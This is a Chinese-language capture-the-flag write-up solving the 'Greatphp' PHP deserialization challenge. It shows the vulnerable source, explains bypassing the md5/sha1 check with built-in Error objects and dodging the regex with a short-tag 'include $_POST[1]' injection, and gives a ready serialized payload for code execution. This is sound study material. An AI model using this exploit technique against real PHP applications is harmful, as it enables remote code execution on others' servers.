[TOC]



## [极客大挑战 2020]Greatphp



```php
<?php
error_reporting(0);
class SYCLOVER {
    public $syc;
    public $lover;

    public function __wakeup(){
        if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ){
           if(!preg_match("/\<\?php|\(|\)|\"|\'/", $this->syc, $match)){
               eval($this->syc);
           } else {
               die("Try Hard !!");
           }
           
        }
    }
}

if (isset($_GET['great'])){
    unserialize($_GET['great']);
} else {
    highlight_file(__FILE__);
}

?>
```

分析一下知道这是反序列化的题

```php
if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) )
```

这里需要使md5、sha1值相等，但是两个变量不同

如果是普通变量的话，我们可以选择数组进行绕过。但这里是在类中，我们不能这么做



我们需要知道，**md5()、sha1()函数可以触发类的`__toString()` 方法**，这是重点

因此，我们只需要让对象的`__toString()`返回值相等即可绕过

这里要用到**php内置类** ： Error、Exception。这两个类都带有`__toString()`方法

<img src="https://s2.loli.net/2023/05/29/xS4tP2qV8aQUhHf.png" alt="image-20230529113202635" style="zoom:50%;" />

我们测试一下：

```php
<?php

$a = new Exception("A");
$b = new Exception("B");
echo $a.PHP_EOL.PHP_EOL;
echo $b;
```

![image-20230529113334552](https://s2.loli.net/2023/05/29/7afuOWGbe6kSqNH.png)

发现只有两个地方不同：A、B 和 5、6

A、B我们可以控制传入相同的payload让其相等，但是5、6是什么意思呢-----行号

我们只需要将定义两个异常类对象写在一行即可：

![image-20230529113854962](https://s2.loli.net/2023/05/29/XRABc1Pq3r4jNke.png)

这样乍一看是相等了，但是我们要注意，这样**两个对象是相等**的：

![image-20230529113831194](https://s2.loli.net/2023/05/29/EfvwGRXbOz21nxg.png)

我们需要了解一下Exception 构造方法的形参有一个异常代码

<img src="https://s2.loli.net/2023/05/29/8pSqnMbm9uI4jBQ.png" alt="image-20230529114134470" style="zoom: 50%;" />

当我们设置的值不同时，对象也就不同了

<img src="https://s2.loli.net/2023/05/29/ExyP3HuKTLXws15.png" alt="image-20230529114225974" style="zoom: 67%;" />



由此，我们突破了第一重限制，接下来分析：

```php
if(!preg_match("/\<\?php|\(|\)|\"|\'/", $this->syc, $match)){
               eval($this->syc);
           }
```

> 如果我们的 `$this->syc` 是一个`Exception`对象的话，由于进行了正则匹配，所以也会触发 `__toString()`方法

我们不能让payload存在 `<?php` 、`()` `"` `'`

但是此时php版本是7，不能用 : `<script language="php"></script>` 写法

我们可以用：`<?= ?>` 的格式

这个格式`隐含echo`， `<?=1?>` 就相当于`echo 1`

<img src="https://s2.loli.net/2023/05/29/pnBtgKHGVZaylco.png" alt="image-20230529120453218" style="zoom:50%;" />

把小括号()过滤了，不能调用函数了，

但是我们可以使用 `include` 这种不需要括号也能调用的

于是我们可以：

```php
?><?=include $_POST[1]?>
```

构造：

```php
<?php
class SYCLOVER {
    public $syc;
    public $lover;

    public function __construct($syc,$lover) {
        $this->syc = $syc;
        $this->lover = $lover;
    }

}
$str = '?><?=include $_POST[1]?>';
$syc = new Error($str,1);$lover = new Error($str,2);
$s = new SYCLOVER($syc,$lover);
echo urlencode(serialize($s));

O%3A8%3A%22SYCLOVER%22%3A2%3A%7Bs%3A3%3A%22syc%22%3BO%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A24%3A%22%3F%3E%3C%3F%3Dinclude+%24_POST%5B1%5D%3F%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A1%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A87%3A%22D%3A%5CApplications%5CCTF%5Cphpstudy_pro%5CWWW%5CCTF%5Cbuuctf%5Cweb4%5C%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98+2020%5DGreatphp.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A13%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7Ds%3A5%3A%22lover%22%3BO%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A24%3A%22%3F%3E%3C%3F%3Dinclude+%24_POST%5B1%5D%3F%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A2%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A87%3A%22D%3A%5CApplications%5CCTF%5Cphpstudy_pro%5CWWW%5CCTF%5Cbuuctf%5Cweb4%5C%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98+2020%5DGreatphp.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A13%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D%7D
```

![image-20230529121057559](https://s2.loli.net/2023/05/29/iAF9arPTCd67lfV.png)













